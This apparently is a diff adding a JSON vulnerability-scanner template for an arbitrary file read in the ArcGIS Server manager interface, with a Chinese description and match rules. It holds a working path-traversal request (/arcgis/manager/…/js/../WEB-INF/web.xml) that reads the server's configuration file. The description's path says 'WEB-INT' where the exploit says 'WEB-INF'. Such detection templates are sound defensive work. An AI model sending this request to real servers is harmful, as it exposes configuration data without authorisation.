@@ -1,0 +1,34 @@
+{
+  "product": "ArcGIS",
+  "vul_name": "ArcGIS 系统manager接口任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 2,
+  "vul_desc": "此漏洞在ArcGIS Server 10.2 for Windows上被发现，在启用了ArcGIS Server Manager服务时，通过GET请求 [主机+端口]/arcgis/manager/3370/js/../WEB-INT/web.xml 地址，任意用户可获取ArcGIS的manager应用服务配置。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/arcgis/manager/4322/js/../WEB-INF/web.xml"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "welcome-file"
+        },
+        {
+          "body": "filter"
+        }
+      ]
+    }
+  }
+}
